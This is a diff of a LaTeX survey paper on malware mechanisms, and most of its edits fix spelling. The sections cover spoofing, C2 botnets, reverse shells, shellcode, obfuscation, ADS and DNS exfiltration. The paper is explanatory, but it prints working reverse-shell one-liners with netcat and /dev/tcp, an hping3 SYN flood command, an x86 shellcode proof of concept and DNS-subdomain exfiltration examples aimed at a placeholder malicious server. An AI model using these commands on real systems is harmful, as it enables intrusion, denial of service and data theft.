+Keyboards can obviously type, with keyboard input being inherently trusted. Input is usually dictated by scripting (commonly 'ducky script')
 with typing that is far faster than a human can write, or even read often enough. A victim may plug it in, see a black command prompt window and have a potential compromise without even knowing. 
 The script could do any manner of damage, usually a payload based off the topics covered in this paper. 
 
-The attack preys upon the human emotion of curiosity, as these usbs are usually either dropped outside randomly and picked up or given in seemingly good faith. Another interesitng point to consider is supply chain.
-Every usb has to be made, and therefore should be a trusted retailer with regular random testing. A cheap 2tb usb stick off ebay may not be the best idea, especially considering that reported device size can be faked to the operating system,
+The attack preys upon the human emotion of curiosity, as these USBs are usually either dropped outside randomly and picked up or given in seemingly good faith. Another interesting point to consider is supply chain.
+Every USB has to be made, and therefore should be a trusted retailer with regular random testing. A cheap 2tb USB stick off eBay may not be the best idea, especially considering that reported device size can be faked to the operating system,
 where it will overwrite itself past it's threshold.
 
 %reference stuxnet
 %\subsubsection{Autorun}
 \section{Address Spoofing}
 In most cases, networks rely on some form of addressing. Addressing allows for scope of computation, and to direct traffic to a given destination. 
-Addressing can also be used for conditional statments, commonly for the implementation of firewall and switch port security rules. Outside of additionally validation of identity, addressing
-is considered absolute, and is inherintly trusted. \citep{IPMACSpoofing}
+Addressing can also be used for conditional statements, commonly for the implementation of firewall and switch port security rules. Outside of additionally validation of identity, addressing
+is considered absolute, and is inherently trusted. \citep{IPMACSpoofing}
 
-In this sense, the question becomes, can you place a malicous server in the network and pretend to be an allowed IP address? It is posisble and is called IP spoofing. A DNS server could be removed from the network, allowing for a threat actor to take it's IP address, 
-which in turn allows for potential compromise of clients. Active directory is a domain controller platform developed by Microsoft, that aims to manage access of users and groups to resources. If this were to be compromised, it would be disasterous. 
-The reason being that IP addresses are intrinsicly tied to domain names, and as such, a spoofed IP, also leads to a falsified domain, which propogates between internal infrastructure. \citep{DNSSpoofing}
+In this sense, the question becomes, can you place a malicious server in the network and pretend to be an allowed IP address? It is possible and is called IP spoofing. A DNS server could be removed from the network, allowing for a threat actor to take it's IP address, 
+which in turn allows for potential compromise of clients. Active directory is a domain controller platform developed by Microsoft, that aims to manage access of users and groups to resources. If this were to be compromised, it would be disastrous. 
+The reason being that IP addresses are intrinsically tied to domain names, and as such, a spoofed IP, also leads to a falsified domain, which propagates between internal infrastructure. \citep{DNSSpoofing}
 
 Another important concept pertains to a specific manipulation of access control lists. Infrastructure tends to follow networking trends, i.e using schemes starting with 192.168.x.x or 10.10.10.x. This knowledge combined with reconnaissance can be used to map out what is normal inside the network.
 If a detection/prevention system treats WAN and LAN the same, a threat actor could pretend to be 192.168.x.x, of which a gateway firewall rule exists to allow access. This fault comes from lacking configuration of which side of infrastructure traffic is coming from. 
-It is reasonable for private IP space traffic to be allowed within for hosts that need it, but said rules should be scoped only to LAN, unless absolutly nesessary. There are cases where some insecurity cannot be avoided, in such cases defence in depth is paramount.
+It is reasonable for private IP space traffic to be allowed within for hosts that need it, but said rules should be scoped only to LAN, unless absolutely necessary. There are cases where some insecurity cannot be avoided, in such cases defence in depth is paramount.
 
-The above pertains to network layer validation, in which an IP address is targetted. The same can be done for the data-link layer, in the form of MAC addresses. MAC addresses can be leveraged to control access to the network, and are useful because they are globally unique and have a vendorID that can be filtered.
-This could mean that you could only allow certain MAC addresses to talk to a router for example. This means that even a spoofed IP would not allow access, however, it is possible to fake a MAC address too, using 'macchanger'. The malicous node could pretend to be on which is allowed, and therefore gain access for communication. 
+The above pertains to network layer validation, in which an IP address is targeted. The same can be done for the data-link layer, in the form of MAC addresses. MAC addresses can be leveraged to control access to the network, and are useful because they are globally unique and have a vendorID that can be filtered.
+This could mean that you could only allow certain MAC addresses to talk to a router for example. This means that even a spoofed IP would not allow access, however, it is possible to fake a MAC address too, using 'macchanger'. The malicious node could pretend to be on which is allowed, and therefore gain access for communication. 
 This can be accomplished with the tool 'macchanger'. \citep{IPMACSpoofing}
 
-The above approach would depend on the access control system in place. If there is a whitelist, the above method would have to be used, which requires knowledge of allowed MAC addresses. If a blacklist is in place, a device could simply use the tool to switch it to something that is not on the block list, perhaps by changing the vendor. If the blacklist is aggressive, and dynamic, then macchanger can be leveraged to respoof the MAC on each boot.
+The above approach would depend on the access control system in place. If there is a whitelist, the above method would have to be used, which requires knowledge of allowed MAC addresses. If a blacklist is in place, a device could simply use the tool to switch it to something that is not on the block list, perhaps by changing the vendor. If the blacklist is aggressive, and dynamic, then macchanger can be leveraged to re-spoof the MAC on each boot.
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
 \chapter{Malware Mechanisms - Exploitation}
 
 \section{Command \& Control}
-Malware tradiotnally is static, meaning that it executes a given task and then finishes. Malware that can be maleable is an asset to a cyber criminal. 
+Malware traditionally is static, meaning that it executes a given task and then finishes. Malware that can be malleable is an asset to a cyber criminal. 
 Some malware has since adapted a command and control model, often shortened to CC or C2. Such model dictates there are 'zombie' machines and a respective master, a master whom sends commands for the zombies to conduct. A botnet.
 
-No longer is malware a sequential process in such case, a threat actor could order it's army to carry out any number of malcious actions. Such systems do have advantages; A large army can do major damage to vulnerable systems, whether in the form of denail of service or otherwise.
-Another reason to use a system such as this is that it creates a layer of pseudo anonmyity. The zombies are conducting the attack; not the master technically. Defence systems would flag up the attackers directly, with the real threat actor getting away with the attack potentially.
+No longer is malware a sequential process in such case, a threat actor could order it's army to carry out any number of malicious actions. Such systems do have advantages; A large army can do major damage to vulnerable systems, whether in the form of denial of service or otherwise.
+Another reason to use a system such as this is that it creates a layer of pseudo anonymity. The zombies are conducting the attack; not the master technically. Defence systems would flag up the attackers directly, with the real threat actor getting away with the attack potentially.
 
-A few things of note; systems are usually zombies without knowledge through some kind of botnet malware. Additionally, if analysis is conducted of a zombie machine (perhaps an aquisistion of a cloud virtual machine), then the communiccation channel may be clear. Proxy chains can help avoid this, creating more layers of relay.
+A few things of note; systems are usually zombies without knowledge through some kind of botnet malware. Additionally, if analysis is conducted of a zombie machine (perhaps an acquisition of a cloud virtual machine), then the communication channel may be clear. Proxy chains can help avoid this, creating more layers of relay.
 
 \subsection{Side Channels}\label{C2Channels}
 There are two kinds of channels that C2 structures operate in. The first is the heartbeat message. Abstractly, a heartbeat, or also known as a keep-alive message is any transmission that lets the botnet master know that a given bot is alive and well. Details can include time, hostname, IP and other relevant system data. \cite{DNSTunneling}
-Specifics of implementation are covered in the DNS Exfiltration section. One of the nuiances for variability here is how bots are distinguished from one another, an example is given later. \ref{DNSHeartbeat}
+Specifics of implementation are covered in the DNS Exfiltration section. One of the nuances for variability here is how bots are distinguished from one another, an example is given later. \ref{DNSHeartbeat}
 
 The second are control messages. Again, the implementation is covered in the DNS section \ref{DNSControl} but from a top down view, they use variable data to distinguish between instructions. These instructions are referenced using pseudo 'OPCodes' of which reflect an action. \cite{DNSTunneling}
 Actions could include but are not limited to :
@@ -464,12 +464,12 @@ The point being is that Denial of Service alone is a type of attack rather than 
 
 
 \section{Bind vs Reverse Shells}
-A Bind/Remote shell is connecting from 'hacker' to victim and establishing a terminal session over IP. This is more of a backdoor, usually once initial compromise has aready occured. 
+A Bind/Remote shell is connecting from 'hacker' to victim and establishing a terminal session over IP. This is more of a backdoor, usually once initial compromise has already occurred. 
 This activity usually seen by firewalls and can be ruined by change of ports, additionally DHCP and NAT cause IPs to change and as a result, the IP of the host, and therefore the listener is unknown.
 
-A reverse shell is the inverse, the victim machine connecting the the 'hacker's' listener. This requires that some form of exploit is conducted, in order to run the arbitrary code required. This does mean passing an IP and port over the network, in order to establihs a connection, however a combination of TLS and proxy chains could help avert this issue.
+A reverse shell is the inverse, the victim machine connecting the the 'hacker's' listener. This requires that some form of exploit is conducted, in order to run the arbitrary code required. This does mean passing an IP and port over the network, in order to establish a connection, however a combination of TLS and proxy chains could help avert this issue.
 
-Netcat lets a threat actor set up connections between a host and a listener. There is the ability to also connect to any listener that is not nativly netcat based, which is referred to as banner grabbing, simply using nc on a ip port can do this. There are different implementations of netcat, such as nc and Nmap's ncat. \citep{Ncat} 
+Netcat lets a threat actor set up connections between a host and a listener. There is the ability to also connect to any listener that is not nativity netcat based, which is referred to as banner grabbing, simply using nc on a IP port can do this. There are different implementations of netcat, such as nc and Nmap's ncat. \citep{Ncat} 
 
 ncat -lvp 1234
 nc 192.168.0.240 1234 -e cmd.exe or /bin/sh or whatever shell/program
@@ -479,9 +479,9 @@ Let’s say we have found a remote code execution (RCE) vulnerability on the tar
 Alternate Tools \& One Liners:
 
 \begin{tcblisting}{listing only}
-bash -i >& /dev/tcp/<IP>/<port> 0>&1 - A one liner that can be injected into most unix systems to grant a shell.
+bash -i >& /dev/tcp/<IP>/<port> 0>&1 - A one liner that can be injected into most UNIX systems to grant a shell.
 MSFVenom - The Metasploit Framework payload creation tool, full of modules for different architectures that safe time so long as they are understood. 
-Pwncat - A modern version of reverse shell technology, creates a C2 structure for better persistance, priv esc, stability, ease of use and control.
+Pwncat - A modern version of reverse shell technology, creates a C2 structure for better persistence, priv esc, stability, ease of use and control.
 \end{tcblisting}
 
 \citep{PentestMonkey}
@@ -492,22 +492,22 @@ Pwncat - A modern version of reverse shell technology, creates a C2 structure fo
 
 
 \section{Data Cryptors}
-Data is our most valuable asset, with much of it being irreplaceable. This is true for both home and corporate users of technology. There is no feasible retaking of a deceased loved one's photo, or the reaqussition of millions of customer records. This is the sad reality of what data cryptors target.
-There are two main motivations for an attack of this kind, one in which access to given data is removed, often permenantly. 
+Data is our most valuable asset, with much of it being irreplaceable. This is true for both home and corporate users of technology. There is no feasible retaking of a deceased loved one's photo, or the re-collection of millions of customer records. This is the sad reality of what data cryptors target.
+There are two main motivations for an attack of this kind, one in which access to given data is removed, often permanently. 
 
-Firstly, Ransomware. The goal is to encrypt as much data as possible with a randomized key, rendering data unless without said key. The attackers then offer the key in exchange for a large ammount of money, often in cryptocurrency for anonymity. Distressed victims may then pay the ransom and may or may not get their data back.
-There is controversy at the time of writing about paying the ransom, which gets even more complicated by the 'professionalism' tgat is evolving into the very lucrative ransomware buisness. The idea being that if an attacker group has 24/7 live chat and customer serivce, they are even more likely to hand over money.
+Firstly, Ransomware. The goal is to encrypt as much data as possible with a randomized key, rendering data unless without said key. The attackers then offer the key in exchange for a large amount of money, often in cryptocurrency for anonymity. Distressed victims may then pay the ransom and may or may not get their data back.
+There is controversy at the time of writing about paying the ransom, which gets even more complicated by the 'professionalism' that is evolving into the very lucrative ransomware business. The idea being that if an attacker group has 24/7 live chat and customer service, they are even more likely to hand over money.
 
-Secondly, encryption for destruction. From time to time there are attacks that are not in it for direct financial gain, rather obstruction and distress. This variant encrypts just the same, with a few notable differences. There is no ransomw, the key often is not transmitted and it is more liked to corporate rivalry or hacktivism.
+Secondly, encryption for destruction. From time to time there are attacks that are not in it for direct financial gain, rather obstruction and distress. This variant encrypts just the same, with a few notable differences. There is no ransom, the key often is not transmitted and it is more liked to corporate rivalry or hacktivism.
 
 %prove claim of the value of data
 
 \section{Buffer Overflows}
-Programs rely on storage and variability. A program that steps through in the exact same way is not always what is needed to solve a given problem. Standard input allows for programs to change at runtime, often with conditional statements. Input does have a limit however, which depends on the data type and system architecture.
+Programs rely on storage and variability. A program that steps through in the exact same way is not always what is needed to solve a given problem. Standard input allows for programs to change at run-time, often with conditional statements. Input does have a limit however, which depends on the data type and system architecture.
 If input exceeds the limits of it's 'box' in memory, the program becomes unstable. It can lead to the user the program is running under causing change or unintended action on the machine, by injecting a very specific payload that will overload the buffer and achieve a given task, such as a reverse shell. This is the result of not validating
 buffer size, using C methods like strcpy. \citep{strcpy}
 
-Strcpy() takes two arguments, destination and source. There is no built in limitation on how much it stores, and is therefore vulnerable. It is particually vulnerable because this is in conjuction with variable values, which are often dictated by user input. 
+Strcpy() takes two arguments, destination and source. There is no built in limitation on how much it stores, and is therefore vulnerable. It is particularly vulnerable because this is in conjunction with variable values, which are often dictated by user input. 
 
 A better solution would be to use strncpy. \citep{strncpy} It takes an extra argument which ensures that the copied string can only be a given length from the source. Newer versions of strcpy have protections, but it is entirely dependant on the one used. \citep{strcpy}
 
@@ -523,8 +523,8 @@ This is a very in depth topic, that is somewhat out of scope, beyond this.
 
 
 \section{Payload vs Shellcode}
-Malware is nothing without some form of code execution. Program code allows for malcious actors to conduct a given task, however, this cannot always be baked into the malware itself.
-It is common for malware to follow 'stager' behaviour,  it would download the majority of the malcious code from a remote server. Another avenue is for the malware 'payload' to be obfuscated, compressed and then
+Malware is nothing without some form of code execution. Program code allows for malicious actors to conduct a given task, however, this cannot always be baked into the malware itself.
+It is common for malware to follow 'stager' behaviour,  it would download the majority of the malicious code from a remote server. Another avenue is for the malware 'payload' to be obfuscated, compressed and then
 injected into a victim by exploiting a given vulnerability. The payload is then executed, and any number of results can come of it. Payloads often come under a few categories:
 
 %cite encoding and obfuscation, and exfil for part
@@ -546,11 +546,11 @@ i91ZHAvZXhhbXBsZS5jb20vODA7
 \end{lstlisting}
 
 Shellcode does come under the payload banner, but is a term used to describe code that returns an interactive terminal session to the threat actor. This means they can execute code at their discretion.
-Payloads often are shellcode in nature, because of the discussed benefits of variable input. Shells vary on system architecture, often coming under Bash or Powershell for their respective operating systems.
+Payloads often are Shellcode in nature, because of the discussed benefits of variable input. Shells vary on system architecture, often coming under Bash or Powershell for their respective operating systems.
 Architecture matters, for both when you are giving explicit shell instructions and when you are injecting an executable shell. 
 
 The difference being that the former relies on the target shell being present, and leveraging it to
-grant a reverse shell, and the latter injecting a malicous shell program that has no prerequesites beyond the architecture it is designed to work on.
+grant a reverse shell, and the latter injecting a malicious shell program that has no prerequisites beyond the architecture it is designed to work on.
 
 A fine example is below \citep{x86Shellcode}:
 \begin{lstlisting}[label=x86Shellcode,caption=x86 Shellcode Example]
@@ -581,17 +581,17 @@ main(void)
 
 \end{lstlisting}
 
-The above code is a proof of concept from www.shell-storm.org. It illustrates that not only can explicit shell instructions be encoded, but that linux binary code can be as well.
-The example simply describes the shellcode, but in reality would be injected using a relevant exploit, and would then return a shell once executed. 
+The above code is a proof of concept from www.shell-storm.org. It illustrates that not only can explicit shell instructions be encoded, but that Linux binary code can be as well.
+The example simply describes the Shellcode, but in reality would be injected using a relevant exploit, and would then return a shell once executed. 
 
-If found in industry, the differences can be shown via meaninful output between normal decoders and running it through a x86 disassembler. 
+If found in industry, the differences can be shown via meaningful output between normal decoders and running it through a x86 disassembler. 
 Typical reverse engineering methods could then be conducted to find the true purpose of the payload. The specifics of static binary analysis, is beyond the scope of this paper. Instead the focus is
-on dynamic behaviourial analysis.
+on dynamic behavioural analysis.
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
 \chapter{Malware Mechanisms - Obfuscation \& Compression}
-Obfuscation is the art of hiding information, to prevent it from being explicitly viewed by those who wish to use it against the hacker. The idea being to muddle up the binary, making it really hard to analyze. There are certain details that are criticial, IP addresses, URLs, locations, registry keys. Onfuscation is inherintly dependant on some creativity, and so,
+Obfuscation is the art of hiding information, to prevent it from being explicitly viewed by those who wish to use it against the hacker. The idea being to muddle up the binary, making it really hard to analyze. There are certain details that are critical, IP addresses, URLs, locations, registry keys. Obfuscation is inherently dependant on some creativity, and so,
 this list is not intended to be comprehensive, but shows the fundamental behaviours they all exhibit.
 \begin{enumerate}
     \item [$\bullet$] Unescape String
@@ -608,15 +608,15 @@ this list is not intended to be comprehensive, but shows the fundamental behavio
 \section{Encoding vs Encryption}
 Encoding is a process in which we represent data in a different format. A simple way to think of this is that A = 1, B = 2. Data representation works in the same way,
 base 10 number systems (decimal) can also be represented in base 2 (binary), alongside many others. The data isn't technically changing value, only how it is overtly interpreted.
-Encoding is often used for compression of data, base 16 (hexidecimal) is particually useful for this as each place vlaue represents two bytes, saving key space. Base64 is another common one, that is used in
-Youtube video URLs as it provides a large unique video ID range, and also means that unlisted videos cannot be sequentially guessed.
+Encoding is often used for compression of data, base 16 (hexadecimal) is particularly useful for this as each place value represents two bytes, saving key space. Base64 is another common one, that is used in
+YouTube video URLs as it provides a large unique video ID range, and also means that unlisted videos cannot be sequentially guessed.
 
 Encoding can also be used for hiding data, relying on the fact that whoever will see the data, will not understand it's meaning and encoding type.
 This means that clear text can be hidden, stopping people who may come across the data in transmission. The major downside of encoding is the lack of variability of security.
-It does not use a key, and is therefore the same each time. Any system that is reversable without a key, is inherintly insecure. As a result, encryption can be used if the data is of importance
+It does not use a key, and is therefore the same each time. Any system that is reversible without a key, is inherently insecure. As a result, encryption can be used if the data is of importance
 
-Encryption is the prcoess of producing cipher text from a given input dataset, using a specifided algorithm that provides different output for every key. The key is the important part here,
-while the process is reversable, it requires a key that is outside of the parameters of the static algorithm. This does a great deal for security abstractly, but very much depends on the algorithm and key size used.
+Encryption is the process of producing cipher text from a given input data-set, using a specified algorithm that provides different output for every key. The key is the important part here,
+while the process is reversible, it requires a key that is outside of the parameters of the static algorithm. This does a great deal for security abstractly, but very much depends on the algorithm and key size used.
 
 \begin{lstlisting}[label=EncodingVsEncryption,caption=Encoding vs Encryption]
 Command =  hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
@@ -666,7 +666,7 @@ This can be defeated (like everything), by having abrupt delays to throw the sys
 Steganography is a technique which involves hiding data inside the makeup of another medium. The mediums often include images, video and in modern day, network protocols. \citep{NetStego}
 The data of importance is injected into the medium in a way that is difficult to spot, and is indistinguishable without the knowledge of the technique. This does depend on the amount of data that is to be injected, there is a trade-off between quality to maintain covert cover and the data size.
 
-The major difference between steganography and cryptography is that the former not only does not explicity morph data into a different representation, rather it conceals it's very existance. If a systems engineer sees text that appears to be encrypted and there is some link to a covert channel, it may raise concern. Using the same example with Steganography,
+The major difference between steganography and cryptography is that the former not only does not explicitly morph data into a different representation, rather it conceals it's very existence. If a systems engineer sees text that appears to be encrypted and there is some link to a covert channel, it may raise concern. Using the same example with Steganography,
 removes the concept of curiosity. \citep{NetStego}
 
 Practical use cases include:
@@ -678,7 +678,7 @@ Practical use cases include:
 \end{enumerate}
 
 The threat is lesser compared to previous years, with detection systems being wary about Steganography inside files. There are considerations with the technique itself; it relies on a medium being downloaded, and also executed. This requirement of user interaction makes it less appealing to threat actors. 
-That being said, some criminals like to reuse old tecniques in new ways which may catch defence by surprise who are often more focused on current events. The technqiue can be performed by various tools, one of which is 'steghide' for unix systems.
+That being said, some criminals like to reuse old techniques in new ways which may catch defence by surprise who are often more focused on current events. The technique can be performed by various tools, one of which is 'steghide' for UNIX systems.
 %cite steghide
 
 %- Malware was found in memes a little while ago, quite widespread, that then contacted a C2. 
@@ -686,10 +686,10 @@ That being said, some criminals like to reuse old tecniques in new ways which ma
 
 
 \section{Alternate Data Streams}
-Alternate Data Streams, often abbreviated as ADS, is a method of hiding information in the metadata portion of a file. This could be used to avoid having to represent data explicity, such as in a text file, which is much more loud in computer forensic sense. ADS messages are not viewable by default, and so could easily slip through manual detection measures.
-ADS came about for NTFS and HFS+ in order to accomodate the extra metadata fields that Macintosh based systems operate with, creating cross-compatability. Whole files can be hidden inside another, which is a crude version of obfuscation. The data can be viewed fairly easily, but requires knowledge of this as a practise. \citep{ADS}
+Alternate Data Streams, often abbreviated as ADS, is a method of hiding information in the metadata portion of a file. This could be used to avoid having to represent data explicitly, such as in a text file, which is much more loud in computer forensic sense. ADS messages are not viewable by default, and so could easily slip through manual detection measures.
+ADS came about for NTFS and HFS+ in order to accommodate the extra metadata fields that Macintosh based systems operate with, creating cross-compatibility. Whole files can be hidden inside another, which is a crude version of obfuscation. The data can be viewed fairly easily, but requires knowledge of this as a practise. \citep{ADS}
 
-Typically data is stored in the :\$DATA portion of the file, and malicious data can be injected into the zone identifier, and also exectuted from.
+Typically data is stored in the :\$DATA portion of the file, and malicious data can be injected into the zone identifier, and also executed from.
 
 Implantation:
 \begin{tcblisting}{listing only}
@@ -717,15 +717,15 @@ Detection:
 dir -R
 \end{tcblisting}
 
-A positive us of ADS comes in the automated scanning of files - often in the ADS in case of malicious payload injection. This is particully prevelant with downloaded files, the origin of the file is stored in the ADS by the browser.
-This lets security software have an extra conditonals to check for to aid detection upon periodic scan or execution. \citep{ADSUse} There is a compressed version of ADS that are difficult to spot to due
+A positive us of ADS comes in the automated scanning of files - often in the ADS in case of malicious payload injection. This is particularly prevalent with downloaded files, the origin of the file is stored in the ADS by the browser.
+This lets security software have an extra conditionals to check for to aid detection upon periodic scan or execution. \citep{ADSUse} There is a compressed version of ADS that are difficult to spot to due
 
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
-\chapter{Malware Mechanisms - Exflitration}
-Modern malware are often not static, it changes and morphs based on remote command. For this to work, there must be some form of communciation from victim to attacker. As discussed above, their is usually a side channel for this.
-In C2 structures, it is often advantagous for communciations to be covert and unreadable, as to not create a breadcrumb trail back. 
+\chapter{Malware Mechanisms - Exfiltration}
+Modern malware are often not static, it changes and morphs based on remote command. For this to work, there must be some form of communication from victim to attacker. As discussed above, their is usually a side channel for this.
+In C2 structures, it is often advantageous for communications to be covert and unreadable, as to not create a breadcrumb trail back. 
 
 Data can be pushed over the network, usually in the form of UDP or TCP traffic. 
 
@@ -739,33 +739,33 @@ Data can be pushed over the network, usually in the form of UDP or TCP traffic.
 
 In the above string, the previously encrypted string is sent over the network using bash's network device. UDP on port 80 was chosen for our example server
 
-The above string is enrcypted at rest, but another layer at transit would be ideal to obfuscate the traffic's purpose.
+The above string is encrypted at rest, but another layer at transit would be ideal to obfuscate the traffic's purpose.
 
 
 \section{TLS}
-Transport Layer Security, and formally Secure Socket Layer (obselte since 1999 when TLS evolved from it) are protcols to encrypt data cryptographically in transit. It's use typically applies to client to server communication. It ensures that while transmitting through potentially insecure nodes of the internet, data is secured and non sensicle to those who potentially have a network tap to view transmission contents. This is extreamly important for communications that are sensitive in nature such as emails and voice communications. \citep{CloudflareTLS}
+Transport Layer Security, and formally Secure Socket Layer (obsolete since 1999 when TLS evolved from it) are protocols to encrypt data cryptographically in transit. It's use typically applies to client to server communication. It ensures that while transmitting through potentially insecure nodes of the internet, data is secured and non sensicle to those who potentially have a network tap to view transmission contents. This is extremely important for communications that are sensitive in nature such as emails and voice communications. \citep{CloudflareTLS}
 
 TLS is ultimately a layer for other protocols to plug into, to push their traffic through, with the other side agreeing to decrypt it in the same way. For example, there is HTTPS, HTTP over TLS. The cryptographic protocol must be agreed upon, as must the decryption key. This is done during the TLS handshake, except without an explicit key as that would be insecure to push over the network in clear text. \citep{CloudflareTLS}
 
 PGP encryption is a popular choice for this, it provides an effective way of maintaining confidentiality and integrity. Each host has a private key only known to them, each also have a public key based on that private key given to anyone who wants it. This is known as asymmetric encryption. When data is asymmetric, private key encrypted data can only be decrypted by the public key of the other side, and vise versa.  
 
-As noted, integrity can be assured with this method. This is especially important in two settings. The first being infrastructure validation, in which server A and B want to ensure they are talking to each other, and not an inpersonator whom wouldn't have the same public key. The second being the validation of websites, particually the ones of high traffic. Often these sites have to handle sensitive infoirmation, and so clearly there is a need for them to prove they are who they are. They use the TLS and PGP process to develop certificates that are given to the browser who then automatically check with certificate authorities (CAs) to ensure they are the real deal. Challenges are oftne given to the domain servers holding a given ceritifciate that only they can complete.
+As noted, integrity can be assured with this method. This is especially important in two settings. The first being infrastructure validation, in which server A and B want to ensure they are talking to each other, and not an impersonator whom wouldn't have the same public key. The second being the validation of websites, particularly the ones of high traffic. Often these sites have to handle sensitive information, and so clearly there is a need for them to prove they are who they are. They use the TLS and PGP process to develop certificates that are given to the browser who then automatically check with certificate authorities (CAs) to ensure they are the real deal. Challenges are often given to the domain servers holding a given certificate that only they can complete.
 
-It is clear that TLS can be used for great purpose, to ensure data can be hidden from those it was not intended for, which helps prevent cyber crime known as man-in-the-middle attacks. A commonality in security is that both sides often use the same tools for different purposes. TLS unfortunalty can be used to encrypt C2 
-channels to make them even more covert in transit. This is due to the flexibility of TLS, along with how computers handle data indiscriminately. Domains are cheap, and registering one for malicous purposes is common place in the criminal world. \citep{TLS}
+It is clear that TLS can be used for great purpose, to ensure data can be hidden from those it was not intended for, which helps prevent cyber crime known as man-in-the-middle attacks. A commonality in security is that both sides often use the same tools for different purposes. TLS unfortunately can be used to encrypt C2 
+channels to make them even more covert in transit. This is due to the flexibility of TLS, along with how computers handle data indiscriminately. Domains are cheap, and registering one for malicious purposes is common place in the criminal world. \citep{TLS}
 
 
 \section{Geo Location Altering}
 As discussed, it is important to conceal the location of the real attacker. It is common in a C2 structure for zombie machines in the botnet to conduct the attacks. This in essence is a proxied attack,
-as the zombies are attacking in place of the master. Proxy chains come in due to the need to remove the direct link from master to slave machies, adding multiple layers of proxy relays all around the world 
-in between all communication either way. This means if a zombie machine was captured, authorities may only see communciation to a random cloud host, whom then talks to another random cloud host. It increases the
-difficult expinentially for law enforcement to find the criminal, as there are a whole assortment of laws that cause issues for accessing cloud services, when traditionally a live capture was all that was needed. 
+as the zombies are attacking in place of the master. Proxy chains come in due to the need to remove the direct link from master to slave machines, adding multiple layers of proxy relays all around the world 
+in between all communication either way. This means if a zombie machine was captured, authorities may only see communication to a random cloud host, whom then talks to another random cloud host. It increases the
+difficult exponentially for law enforcement to find the criminal, as there are a whole assortment of laws that cause issues for accessing cloud services, when traditionally a live capture was all that was needed. 
 
 
-TOR is anoter endevor that is intended to escape censorship and monitoring, that is also used by criminals to hide their real location. It runs using onion routing which ensures that the host is not linked to the destination by
+TOR is another endeavor that is intended to escape censorship and monitoring, that is also used by criminals to hide their real location. It runs using onion routing which ensures that the host is not linked to the destination by
 bouncing traffic through over nodes on the tor relay, that scan all across the globe. The specifics are out of scope for this paper but the concept is that the client communicates with a onion based directory server, the first router is
 contacted and a Diffie-Hellman key exchange is initiated (to establish short live keys), with this repeating for 3 hops to create a non attributable link to the destination. The IP header is wrapped inside an 'onion' that is peeled back at each node, to reveal information about how to reach the next.
-The process is more involed than that in reality, but again, is out of scope for this paper. \citep{TorMalware}
+The process is more involved than that in reality, but again, is out of scope for this paper. \citep{TorMalware}
 
 TOR can cause problems for those who require some baseline of monitoring, whether than be a place of education or a workplace, to avoid policy and law violations. It often is used for criminal activity, with port scanning, 
 C2 and exfiltration often being carried out over the darknet that TOR is often used to connect to. \citep{TorMalware}
@@ -777,12 +777,12 @@ C2 and exfiltration often being carried out over the darknet that TOR is often u
 \section{Protocol Payload Abuse}
 
 \subsection{DNS}
-Domain Name Service, commonly known as DNS is a protocol that servers to resolve domain names to their respective IP addresses (and vice versa). It acts as a way for humans to use the internet in a more intuative and
+Domain Name Service, commonly known as DNS is a protocol that servers to resolve domain names to their respective IP addresses (and vice versa). It acts as a way for humans to use the internet in a more intuitive and
 memorable way, as well as allowing for variability in infrastructure deployments. If a file share is given a domain name and port, that domain name can then be used in clients that it serves; if the IP that is resolved into changes,
 then the client needs not change anything, and so less configuration is needed long term. Another point to make is that this allows for a round robin approach to load balancing where a given domain name resolves to different IP addresses providing the
 same service which evens the workload. 
 
-DNS is commonly used on most networks, as it provides an integral part in most interaction, human and programs alike. The assumption that DNS would be on practically any network can be used in an adversarie's favour; DNS is not often monitored to the degree it should be.
+DNS is commonly used on most networks, as it provides an integral part in most interaction, human and programs alike. The assumption that DNS would be on practically any network can be used in an adversary's favour; DNS is not often monitored to the degree it should be.
 DNS allows for fairly covert channels to transport data, that if done well, can bypass firewall and IDS/IPS systems. A C2 structure can be formed through this communication.
 
 An abstract from a relevant paper \citep{DNSExfiltration}: 
@@ -817,8 +817,8 @@ the request and reconstructs it into the original format."
 
 \subsubsection{DNS Subdomain Manipulation}
 
-DNS requests and responces are used to transport data convertly. To a greater depth, this is accomplished via the ability to append a subdomain to a registered domain.
-DNS traffic is routed through infrastructure until it hits the authoritative server that is malicous, the logs are read and the data is stolen. Data is often compressed, 
+DNS requests and responses are used to transport data covertly. To a greater depth, this is accomplished via the ability to append a subdomain to a registered domain.
+DNS traffic is routed through infrastructure until it hits the authoritative server that is malicious, the logs are read and the data is stolen. Data is often compressed, 
 encoded and something even encrypted to fit into the of the domain field up to the UDP limit (look into it). \citep{DNSTunneling} Data transmitted this way is difficult to spot, and meaningless 
 if found without context. The DNS server can either be threat actor controlled or hijacked infrastructure. Firewall rules allowing only certain IP addresses to access domains can
 be bypassed with UDP IP spoofing, where a complete whitelist approach of approved domain names would be ideal. \citep{DNSSpoof&Exfil}
@@ -833,7 +833,7 @@ For example:
     6f44ebbaebd05e727f362e15f30315.malicousServer.net
 \end{tcblisting}
 
-In reality. this can be improved upon. The above subdomain is long, and so splitting it up would look much less suspicuous. The ability to know something is suspicuous is
+In reality. this can be improved upon. The above subdomain is long, and so splitting it up would look much less suspicious. The ability to know something is suspicious is
 still dangerous to an adversary.
 
 Much better:
@@ -850,23 +850,23 @@ Much better:
 
 \subsubsection{DNS Tunneling}
 There are multiple vectors in the DNS protocol to attach meaningful variance; 
-The domain name itsself that is attempted to be resolved as discussed, using common queries such as A or AAAA and tunneling other protocols as payloads
+The domain name itself that is attempted to be resolved as discussed, using common queries such as A or AAAA and tunneling other protocols as payloads
 through the query payload of the DNS query. Depending on the throughput needed, the requests can be segmented to be more covert, as tunneling 
 high bandwidth protocols through DNS can be quite loud in respective to detection software. \citep{DNSExfiltration} Common tunneled protocols include
-SSH, HTTP and HTTPS. SSH and HTTPs have the benefit of having obfuscation in encryption, rather than just hiding http downloads in clear text encoded base64 \citep{DNSTunneling}
+SSH, HTTP and HTTPS. SSH and HTTPs have the benefit of having obfuscation in encryption, rather than just hiding HTTP downloads in clear text encoded base64 \citep{DNSTunneling}
 
 %show encoded http request under DNS
 
 \subsubsection{DNS Infiltration}
 
-Another place to insert data is in a TXT responce; If a NOERROR (Maybe explain more) TXT request is initated by the victim (it would normally be NXDOMAIN), 
+Another place to insert data is in a TXT response; If a NOERROR (Maybe explain more) TXT request is initiated by the victim (it would normally be NXDOMAIN), 
